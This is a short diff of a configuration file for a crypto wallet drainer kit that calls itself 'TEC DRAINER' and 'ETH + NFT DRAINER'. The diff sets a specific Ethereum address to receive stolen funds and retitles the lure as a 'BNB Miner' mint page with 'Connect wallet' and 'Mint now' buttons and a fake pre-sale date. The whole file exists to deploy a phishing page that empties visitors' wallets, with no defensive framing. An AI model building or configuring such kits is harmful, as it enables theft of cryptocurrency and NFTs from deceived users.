@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "0x43091796F9C45d47788445f1cB3C04E67588F401";
 
 const collectionInfo = {
     name: "TEC DRAINER",
@@ -11,7 +11,7 @@ const collectionInfo = {
 
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
-    title: "{name}", // {name} will be replaced with collectionInfo.name
+    title: "{BNB Miner}", // {name} will be replaced with collectionInfo.name
     underTitle: "ETH + NFT DRAINER",
 }
 
@@ -33,7 +33,7 @@ const drainNftsInfo = {
 }
 
 const customStrings = {
-    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "MINT {BNB}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
     transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
